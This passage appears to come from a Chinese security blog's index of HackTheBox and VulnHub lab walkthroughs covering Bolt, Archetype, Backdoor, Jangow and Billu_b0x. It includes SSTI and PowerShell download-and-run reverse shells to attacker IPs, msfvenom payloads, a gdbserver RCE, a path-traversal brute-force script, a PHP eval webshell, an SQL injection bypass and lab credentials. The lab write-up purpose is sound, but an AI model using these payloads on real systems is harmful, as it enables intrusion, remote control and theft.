url_for('home_blueprint.confirm_changes',token=token,_external=True) html = render_template('emails/confirm-changes.html',confirm_url=confirm_url) msg.html = html mail.send(msg) return render_template('index.html') @blueprint.route('/confirm/changes/\u003ctoken\u003e') def confirm_changes(token): \"\"\"Confirmation Token\"\"\" try: email = ts.loads(token, salt=\"changes-confirm-key\", max_age=86400) except: abort(404) user = User.query.filter_by(username=email).first_or_404() name = user.profile_update template = open('templates/emails/update-name.html', 'r').read() msg = Message( recipients=[f'{user.email}'], sender = 'support@example.com', reply_to = 'support@example.com', subject = \"Your profile changes have been confirmed.\" ) msg.html = render_template_string(template % name) mail.send(msg) return render_template('index.html') forms.py class UpdateProfileForm(FlaskForm): name = TextField('Name', id='name', validators=[DataRequired()]) experience = TextField('Experience', id='experience', validators=[DataRequired()]) skills = TextField('Skills', id='skills', validators=[DataRequired()]) templates/emails/update-name.html examples-profile.html \u003cdiv class=\"tab-pane\" id=\"settings\"\u003e \u003cp\u003eEmail verification is required in order to update personal information.\u003c/p\u003e \u003cform class=\"form-horizontal\" action=\"/example-profile\" method=\"POST\"\u003e \u003cdiv class=\"form-group row\"\u003e \u003clabel for=\"inputName2\" class=\"col-sm-2 col-form-label\"\u003eName\u003c/label\u003e \u003cdiv class=\"col-sm-10\"\u003e \u003cinput type=\"text\" class=\"form-control\" id=\"inputName2\" name=\"name\" placeholder=\"Name\"\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003clabel for=\"inputExperience\" class=\"col-sm-2 col-form-label\"\u003eExperience\u003c/label\u003e \u003cdiv class=\"col-sm-10\"\u003e \u003ctextarea class=\"form-control\" id=\"inputExperience\" name=\"experience\" placeholder=\"Experience\"\u003e\u003c/textarea\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003clabel for=\"inputSkills\" class=\"col-sm-2 col-form-label\"\u003eSkills\u003c/label\u003e \u003cdiv class=\"col-sm-10\"\u003e \u003cinput type=\"text\" class=\"form-control\" id=\"inputSkills\" name=\"skills\" placeholder=\"Skills\"\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003cdiv class=\"offset-sm-2 col-sm-10\"\u003e \u003cdiv class=\"checkbox\"\u003e \u003clabel\u003e \u003cinput type=\"checkbox\"\u003e I agree to the \u003ca href=\"#\"\u003eterms and conditions\u003c/a\u003e \u003c/label\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003cdiv class=\"offset-sm-2 col-sm-10\"\u003e \u003cbutton type=\"submit\" class=\"btn btn-danger\"\u003eSubmit\u003c/button\u003e \u003c/div\u003e \u003c/div\u003e \u003c/form\u003e \u003c/div\u003e \u003chtml\u003e \u003cbody\u003e \u003cp\u003e %s \u003c/p\u003e \u003cp\u003e This e-mail serves as confirmation of your profile username changes.\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 尝试在这里进行模板注入 然后根据网页提示去邮箱mail.bolt.htb检查邮件 点击确认连接,邮箱收到新的邮件其中包含模板注入的结果 {{\"\".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}返回www-data 反弹shell {{\"\".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('echo \"aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKaXA9IjEwLjEwLjE2LjciCnBvcnQ9ODAwMApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKGlwLHBvcnQpKQpvcy5kdXAyKHMuZmlsZW5vKCksMCkKb","date":"2022-01-06","objectID":"/htb-bolt/:4:0","tags":null,"title":"HackTheBox-Bolt","uri":"/htb-bolt/"},{"categories":["HackTheBox"],"content":"获取root权限 find / -user root -perm -4000 -print 2\u003e/dev/null /opt/google/chrome/chrome-sandbox /usr/sbin/pppd /usr/lib/xorg/Xorg.wrap /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/bin/newgrp /usr/bin/passwd /usr/bin/chfn /usr/bin/gpasswd /usr/bin/vmware-user-suid-wrapper /usr/bin/umount /usr/bin/fusermount /usr/bin/mount /usr/bin/su /usr/bin/sudo /usr/bin/chsh 传个pspy上去看看有没有特别的进程 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2022/01/30 04:30:01 \u001b[32;1mCMD: UID=127 PID=964 | /usr/sbin/mysqld \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=948 | dovecot/config \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=945 | dovecot/log \u001b[0m 2022/01/30 04:30:01 \u001b[36;1mCMD: UID=129 PID=944 | dovecot/anvil \u001b[0m 2022/01/30 04:30:01 \u001b[36;1mCMD: UID=116 PID=911 | /usr/sbin/kerneloops \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=909 | /sbin/agetty -o -p -- \\u --noclear tty1 linux \u001b[0m 2022/01/30 04:30:01 \u001b[36;1mCMD: UID=116 PID=904 | /usr/sbin/kerneloops --test \u001b[0m 2022/01/30 04:30:01 \u001b[36;1mCMD: UID=33 PID=886 | php-fpm: pool www \u001b[0m 2022/01/30 04:30:01 \u001b[35;1mCMD: UID=120 PID=877 | /usr/bin/whoopsie -f \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=871 | /usr/sbin/dovecot -F \u001b[0m 2022/01/30 04:30:01 \u001b[36;1mCMD: UID=33 PID=867 | nginx: worker process \u001b[0m 2022/01/30 04:30:01 \u001b[36;1mCMD: UID=33 PID=866 | nginx: worker process \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=865 | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=853 | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=850 | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf) \u001b[0m 2022/01/30 04:30:01 \u001b[36;1mCMD: UID=33 PID=846 | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app \u001b[0m 2022/01/30 04:30:01 \u001b[36;1mCMD: UID=33 PID=845 | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=768 | /usr/sbin/ModemManager \u001b[0m 2022/01/30 04:30:01 \u001b[35;1mCMD: UID=115 PID=682 | avahi-daemon: chroot helper \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=676 | /usr/bin/vmtoolsd \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=667 | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=651 | /lib/systemd/systemd-logind \u001b[0m 2022/01/30 04:30:01 \u001b[35;1mCMD: UID=104 PID=644 | /usr/sbin/rsyslogd -n -iNONE \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=633 | /usr/lib/policykit-1/polkitd --no-debug \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=630 | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=625 | /usr/sbin/irqbalance --foreground \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=606 | /usr/sbin/NetworkManager --no-daemon \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=103 PID=605 | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=604 | /usr/sbin/cron -f \u001b[0m 2022/01/30 04:30:01 \u001b[35;1mCMD: UID=115 PID=603 | avahi-daemon: running [bolt.local] \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=598 | /usr/sbin/acpid \u001b[0m 2022/01/30 04:30:01 \u001b[34;1mCMD: UID=0 PID=590 | /usr/bin/VGAuthService \u001b[0m 2022/01/30 04:30:01 \u001b[35;1mCMD: UID=102 PID=539 | /lib/systemd/systemd-timesyncd \u001b[0m 20","date":"2022-01-06","objectID":"/htb-bolt/:5:0","tags":null,"title":"HackTheBox-Bolt","uri":"/htb-bolt/"},{"categories":["HackTheBox"],"content":"前期工作 对靶机进行扫描nmap -A 10.10.10.27 445/tcp端口,用于Windows系统的共享文件夹 1433/tcp端口,用于MSSQL端口 首先对445端口的共享文件夹进行查看 smbclient -N -L 10.10.10.27 尝试对文件夹内的内容进行读取 prod.dtsConfig文件内容为 \u003cDTSConfiguration\u003e \u003cDTSConfigurationHeading\u003e \u003cDTSConfigurationFileInfo GeneratedBy=\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/\u003e \u003c/DTSConfigurationHeading\u003e \u003cConfiguration ConfiguredType=\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\"\u003e \u003cConfiguredValue\u003eData Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;\u003c/ConfiguredValue\u003e \u003c/Configuration\u003e \u003c/DTSConfiguration\u003e 可以知道用户名为ARCHETYPE\\sql_svc,而密码为M3g4c0rp123 ","date":"2022-01-05","objectID":"/htb-archetype/:1:0","tags":null,"title":"HackTheBox-Archetype","uri":"/htb-archetype/"},{"categories":["HackTheBox"],"content":"xp_cmdshell获取user权限 用https://github.com/SecureAuthCorp/impacket下的examples/mssqlclient.py进行数据库连接 python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth 用SELECT IS_SRVROLEMEMBER('sysadmin')查看当前权限 https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15#examples IF IS_SRVROLEMEMBER ('sysadmin') = 1 print 'Current user''s login is a member of the sysadmin role' ELSE IF IS_SRVROLEMEMBER ('sysadmin') = 0 print 'Current user''s login is NOT a member of the sysadmin role' ELSE IF IS_SRVROLEMEMBER ('sysadmin') IS NULL print 'ERROR: The server role specified is not valid.'; 当前权限为sysadmin 开启xp_cmdshell 网络状况 在C:\\Users\\sql_svc\\Desktop\\找到user flag 用nishang反弹shell xp_cmdshell \"powershell IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.16.45:8000/Invoke-PowerShellTcp.ps1\\\");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.45 -port 8080\" ","date":"2022-01-05","objectID":"/htb-archetype/:2:0","tags":null,"title":"HackTheBox-Archetype","uri":"/htb-archetype/"},{"categories":["HackTheBox"],"content":"获取root权限 命令历史记录 psexec连接服务器 手动开了3389但是连不上?? 在C:\\Users\\Administrator\\Desktop\\找到root flag ","date":"2022-01-05","objectID":"/htb-archetype/:3:0","tags":null,"title":"HackTheBox-Archetype","uri":"/htb-archetype/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 把10.10.11.125 backdoor.htb 加到/etc/hosts中 WordPress 5.8.1用wpscan去扫描,可知http://10.10.11.125/wp-content/uploads/可以列出文件 用gobuster去爆破路径 ./gobuster dir -w /home/kali/SecTools/SecLists-2021.4/Discovery/Web-Content/directory-list-2.3-small.txt -u http://backdoor.htb/ -t 100 /wp-content (Status: 301) [Size: 317] [--\u003e http://backdoor.htb/wp-content/] /wp-includes (Status: 301) [Size: 318] [--\u003e http://backdoor.htb/wp-includes/] /wp-admin (Status: 301) [Size: 315] [--\u003e http://backdoor.htb/wp-admin/] ./gobuster dir -w /home/kali/SecTools/SecLists-2021.4/Discovery/Web-Content/directory-list-2.3-small.txt -u http://backdoor.htb/wp-content/ -t 100 /themes (Status: 301) [Size: 324] [--\u003e http://backdoor.htb/wp-content/themes/] /uploads (Status: 301) [Size: 325] [--\u003e http://backdoor.htb/wp-content/uploads/] /plugins (Status: 301) [Size: 325] [--\u003e http://backdoor.htb/wp-content/plugins/] /upgrade (Status: 301) [Size: 325] [--\u003e http://backdoor.htb/wp-content/upgrade/] /wp-content/plugins/ebook-download/filedownload.php可能存在文件下载 但是wfuzz没有fuzz出来… wfuzz -c -w ~/SecTools/SecLists-2021.4/Discovery/Web-Content/burp-parameter-names.txt -u \"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?FUZZ=../../../../../../../../etc/passwd\" ","date":"2022-01-04","objectID":"/htb-backdoor/:1:0","tags":null,"title":"HackTheBox-Backdoor","uri":"/htb-backdoor/"},{"categories":["HackTheBox"],"content":"任意文件下载 从http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt得知该版本为1.1 有个任意文件下载漏洞WordPress Plugin eBook Download 1.1 - Directory Traversal 参数是ebookdownloadurl,字典里面没有这个… http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl= wp-config.php /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'wordpressuser' ); /** MySQL database password */ define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); /** Database charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8' ); /** The database collate type. Don't change this if in doubt. */ define( 'DB_COLLATE', '' ); /etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network❌100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync❌102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus❌103:106::/nonexistent:/usr/sbin/nologin syslog❌104:110::/home/syslog:/usr/sbin/nologin _apt❌105:65534::/nonexistent:/usr/sbin/nologin tss❌106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd❌107:112::/run/uuidd:/usr/sbin/nologin tcpdump❌108:113::/nonexistent:/usr/sbin/nologin landscape❌109:115::/var/lib/landscape:/usr/sbin/nologin pollinate❌110:1::/var/cache/pollinate:/bin/false usbmux❌111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd❌112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologin user❌1000:1000:user:/home/user:/bin/bash lxd❌998💯:/var/snap/lxd/common/lxd:/bin/false mysql❌113:118:MySQL Server,,,:/nonexistent:/bin/false 尝试用MQYBJSaD#DxG6qbm去登录ssh和登录后台均失败 hello.php没啥用的插件… ","date":"2022-01-04","objectID":"/htb-backdoor/:2:0","tags":null,"title":"HackTheBox-Backdoor","uri":"/htb-backdoor/"},{"categories":["HackTheBox"],"content":"爆破cmdline 尝试去爆破/proc/xxx/cmdline import requests headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62'} url=\"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../proc/%s/cmdline\" for i in range(50000): r=requests.get(url=url%str(i),headers=headers) cmdline=r.text[r.text.index('cmdline',100)+7:r.text.index('\u003cscript\u003ewindow.close()\u003c/script\u003e')] if cmdline=='': continue else: print(i,cmdline) 1 /sbin/initautoautomatic-ubiquitynoprompt 486 /lib/systemd/systemd-journald 513 /lib/systemd/systemd-udevd 528 /lib/systemd/systemd-networkd 658 /sbin/multipathd-d-s 659 /sbin/multipathd-d-s 660 /sbin/multipathd-d-s 661 /sbin/multipathd-d-s 662 /sbin/multipathd-d-s 663 /sbin/multipathd-d-s 664 /sbin/multipathd-d-s 684 /lib/systemd/systemd-resolved 687 /lib/systemd/systemd-timesyncd 692 /usr/bin/VGAuthService 698 /usr/bin/vmtoolsd 752 /lib/systemd/systemd-timesyncd 753 /usr/bin/vmtoolsd 754 /usr/bin/vmtoolsd 755 /usr/lib/accountsservice/accounts-daemon 757 /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only 758 /usr/bin/vmtoolsd 762 /usr/lib/accountsservice/accounts-daemon 770 /usr/sbin/irqbalance--foreground 771 /usr/bin/python3/usr/bin/networkd-dispatcher--run-startup-triggers 774 /usr/sbin/irqbalance--foreground 776 /usr/sbin/rsyslogd-n-iNONE 780 /lib/systemd/systemd-logind 794 /usr/sbin/rsyslogd-n-iNONE 795 /usr/sbin/rsyslogd-n-iNONE 796 /usr/sbin/rsyslogd-n-iNONE 829 /usr/sbin/cron-f 831 /usr/sbin/CRON-f 832 /usr/sbin/CRON-f 846 /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done 849 /bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done 859 /usr/sbin/atd-f 866 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 884 /usr/sbin/apache2-kstart 916 /usr/lib/accountsservice/accounts-daemon 937 /sbin/agetty-o-p -- \\u--nocleartty1linux 944 /usr/sbin/mysqld 950 /usr/lib/policykit-1/polkitd--no-debug 953 /usr/lib/policykit-1/polkitd--no-debug 955 /usr/lib/policykit-1/polkitd--no-debug 979 /lib/systemd/systemd--user 980 (sd-pam) 1015 /usr/sbin/mysqld 1018 /usr/sbin/mysqld 1019 /usr/sbin/mysqld 1020 /usr/sbin/mysqld ... ","date":"2022-01-04","objectID":"/htb-backdoor/:3:0","tags":null,"title":"HackTheBox-Backdoor","uri":"/htb-backdoor/"},{"categories":["HackTheBox"],"content":"通过gdbserver获取user权限 注意到有个gdbserver监听在1337端口,可以利用这个gdbserver去getshell GNU gdbserver 9.2 - Remote Command Execution (RCE) Usage: python3 {sys.argv[0]} \u003cgdbserver-ip:port\u003e \u003cpath-to-shellcode\u003e Example: - Victim's gdbserver -\u003e 10.10.10.200:1337 - Attacker's listener -\u003e 10.10.10.100:4444 1. Generate shellcode with msfvenom: $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin 2. Listen with Netcat: $ nc -nlvp 4444 3. Run the exploit: $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin 也可以手动getshell msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=4000 -f elf -o /tmp/rev生成反弹文件,同时在4000端口开启监听 在本地开启gdb,同时设置远程连接target extended-remote 10.10.11.125:1337 cd /tmp remote put rev rev set remote exec-file /home/user/rev run 在~/.ssh下面加个authorized_keys以便ssh连接 ","date":"2022-01-04","objectID":"/htb-backdoor/:4:0","tags":null,"title":"HackTheBox-Backdoor","uri":"/htb-backdoor/"},{"categories":["HackTheBox"],"content":"获取root权限 find / -user root -perm -4000 -print 2\u003e/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/chfn /usr/bin/gpasswd /usr/bin/su /usr/bin/sudo /usr/bin/newgrp /usr/bin/fusermount /usr/bin/screen /usr/bin/umount /usr/bin/mount /usr/bin/chsh /usr/bin/pkexec 结合前面读取proc时的结果846 /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done 利用/usr/bin/screen进行提权 帮助文档 -x Attach to a not detached screen. (Multi display mode). 执行screen -x root/root即可 ","date":"2022-01-04","objectID":"/htb-backdoor/:5:0","tags":null,"title":"HackTheBox-Backdoor","uri":"/htb-backdoor/"},{"categories":["VulnHub"],"content":"https://www.vulnhub.com/entry/jangow-101,754/ ","date":"2021-12-01","objectID":"/vulnhub-jangow_1.0.1/:0:0","tags":null,"title":"VulnHub-Jangow:1.0.1","uri":"/vulnhub-jangow_1.0.1/"},{"categories":["VulnHub"],"content":"前期工作 xray扫描得知存在命令执行 [Vuln: cmd-injection] Target \"http://192.168.56.118/site/busque.php?buscar=\" VulnType \"injection/cmd\" Payload \"\\nexpr 924417132 + 879096350\\n\" Position \"query\" ParamKey \"buscar\" ParamValue \"\\nexpr 924417132 + 879096350\\n\" feature \"1803513482\" type \"echo_based\" ","date":"2021-12-01","objectID":"/vulnhub-jangow_1.0.1/:1:0","tags":null,"title":"VulnHub-Jangow:1.0.1","uri":"/vulnhub-jangow_1.0.1/"},{"categories":["VulnHub"],"content":"获取user权限 写入webshell,echo '\u003c?php eval($_POST[a]);?\u003e' \u003e a.php,权限为www-data /var/www/html/.backup $servername = \"localhost\"; $database = \"jangow01\"; $username = \"jangow01\"; $password = \"abygurl69\"; // Create connection $conn = mysqli_connect($servername, $username, $password, $database); // Check connection if (!$conn) { die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected successfully\"; mysqli_close($conn); /var/www/html/site/wordpress/config.php \u003c?php $servername = \"localhost\"; $database = \"desafio02\"; $username = \"desafio02\"; $password = \"abygurl69\"; // Create connection $conn = mysqli_connect($servername, $username, $password, $database); // Check connection if (!$conn) { die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected successfully\"; mysqli_close($conn); ?\u003e /home/jangow01/user.txt d41d8cd98f00b204e9800998ecf8427e cmd5反查得知其为空字符的md5 反弹shell,发现存在端口限制,试了试80,443等常用端口,发现443端口不受影响 import socket import subprocess import os ip=\"192.168.56.1\" port=443 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((ip,port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); 尝试切换用户jangow01,返回su: must be run from a terminal,需要将反弹回来的shell转换为交互式的shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")' python3 -c \"__import__('subprocess').call(['/bin/bash'])\" 建议使用第一种方法,成功利用密码abygurl69切换到用户jangow01 ","date":"2021-12-01","objectID":"/vulnhub-jangow_1.0.1/:2:0","tags":null,"title":"VulnHub-Jangow:1.0.1","uri":"/vulnhub-jangow_1.0.1/"},{"categories":["VulnHub"],"content":"获取root权限 靶机环境为ubuntu16.04,直接用CVE-2021-3156尝试提权,提示AssertionError: glibc is too old. The exploit is relied on glibc tcache feature. Need version \u003e= 2.26 换个CVE-2016-5195,好像宕机了qwq,在真实渗透环境已经gg了… 尝试用CVE-2017-16995提权,成功提权 ufw配置情况 ","date":"2021-12-01","objectID":"/vulnhub-jangow_1.0.1/:3:0","tags":null,"title":"VulnHub-Jangow:1.0.1","uri":"/vulnhub-jangow_1.0.1/"},{"categories":["VulnHub"],"content":"https://www.vulnhub.com/entry/billu-b0x,188/ ","date":"2021-11-04","objectID":"/vulnhub-billu_b0x/:0:0","tags":null,"title":"VulnHub-Billu_b0x","uri":"/vulnhub-billu_b0x/"},{"categories":["VulnHub"],"content":"前期工作 index.php提示进行sql注入,但使用万能密码进行初步尝试,返回Try Again,推测闭合方式不正确或者存在过滤 dirsearch扫描得到的主要路径 http://172.20.2.129:80/add.php http://172.20.2.129:80/c.php http://172.20.2.129:80/index.php http://172.20.2.129:80/show.php http://172.20.2.129:80/test.php http://172.20.2.129:80/head.php http://172.20.2.129:80/in http://172.20.2.129/phpmy http://172.20.2.129/phpmy跳转到phpmyadmin的登录页面 ","date":"2021-11-04","objectID":"/vulnhub-billu_b0x/:1:0","tags":null,"title":"VulnHub-Billu_b0x","uri":"/vulnhub-billu_b0x/"},{"categories":["VulnHub"],"content":"任意文件读取 打开test.php提示要向其传递file参数,推测其可能为文件包含或文件读取,尝试GET传参失败,使用POST传参成功 index.php关键内容如下 $uname=str_replace('\\'','',urldecode($_POST['un'])); $pass=str_replace('\\'','',urldecode($_POST['ps'])); $run='select * from auth where pass=\\''.$pass.'\\' and uname=\\''.$uname.'\\''; ","date":"2021-11-04","objectID":"/vulnhub-billu_b0x/:2:0","tags":null,"title":"VulnHub-Billu_b0x","uri":"/vulnhub-billu_b0x/"},{"categories":["VulnHub"],"content":"进入网站后台 传入un= or 1=1#\u0026ps=\\ 此时语句为select * from auth where pass='\\' and uname=' or 1=1#',pass的内容为\\' and uname= 成功登录 in打开显示为phpinfo的内容,add.php打开显示存在上传点,但查看源代码后可知其不存在处理上传的php代码 show.php \u003c?php include('c.php'); if(isset($_POST['continue'])) { $run='select * from users '; $result = mysqli_query($conn, $run); if (mysqli_num_rows($result) \u003e 0) { echo \"\u003ctable width=90% \u003e\u003ctr\u003e\u003ctd\u003eID\u003c/td\u003e\u003ctd\u003eUser\u003c/td\u003e\u003ctd\u003eAddress\u003c/td\u003e\u003ctd\u003eImage\u003c/td\u003e\u003c/tr\u003e\"; while($row = mysqli_fetch_assoc($result)) { echo '\u003ctr\u003e\u003ctd\u003e'.$row['id'].'\u003c/td\u003e\u003ctd\u003e'.htmlspecialchars ($row['name'],ENT_COMPAT).'\u003c/td\u003e\u003ctd\u003e'.htmlspecialchars ($row['address'],ENT_COMPAT).'\u003c/td\u003e\u003ctd\u003e\u003cimg src=\"uploaded_images/'.htmlspecialchars ($row['image'],ENT_COMPAT).'\" height=90px width=100px\u003e\u003c/td\u003e\u003c/tr\u003e'; } echo \"\u003c/table\u003e\"; } } ?\u003e c.php中含有数据库连接密码$conn = mysqli_connect(\"127.0.0.1\",\"billu\",\"b0x_billu\",\"ica_lab\"); 尝试利用该密码进行登录和ssh连接均失败,使用该密码成功登录phpmyadmin 使用查询得到的用户名和密码成功登录网站 panel.php的内容 \u003c?php session_start(); include('c.php'); include('head2.php'); if(@$_SESSION['logged']!=true ) { header('Location: index.php', true, 302); exit(); } echo \"Welcome to billu b0x \"; echo '\u003cform method=post style=\"margin: 10px 0px 10px 95%;\"\u003e\u003cinput type=submit name=lg value=Logout\u003e\u003c/form\u003e'; if(isset($_POST['lg'])) { unset($_SESSION['logged']); unset($_SESSION['admin']); header('Location: index.php', true, 302); } echo '\u003chr\u003e\u003cbr\u003e'; echo '\u003cform method=post\u003e \u003cselect name=load\u003e \u003coption value=\"show\"\u003eShow Users\u003c/option\u003e \u003coption value=\"add\"\u003eAdd User\u003c/option\u003e \u003c/select\u003e \u0026nbsp\u003cinput type=submit name=continue value=\"continue\"\u003e\u003c/form\u003e\u003cbr\u003e\u003cbr\u003e'; if(isset($_POST['continue'])) { $dir=getcwd(); $choice=str_replace('./','',$_POST['load']); if($choice==='add') { include($dir.'/'.$choice.'.php'); die(); } if($choice==='show') { include($dir.'/'.$choice.'.php'); die(); } else { include($dir.'/'.$_POST['load']); } } if(isset($_POST['upload'])) { $name=mysqli_real_escape_string($conn,$_POST['name']); $address=mysqli_real_escape_string($conn,$_POST['address']); $id=mysqli_real_escape_string($conn,$_POST['id']); if(!empty($_FILES['image']['name'])) { $iname=mysqli_real_escape_string($conn,$_FILES['image']['name']); $r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION); $image=array('jpeg','jpg','gif','png'); if(in_array($r,$image)) { $finfo = @new finfo(FILEINFO_MIME); $filetype = @$finfo-\u003efile($_FILES['image']['tmp_name']); if(preg_match('/image\\/jpeg/',$filetype ) || preg_match('/image\\/png/',$filetype ) || preg_match('/image\\/gif/',$filetype )) { if 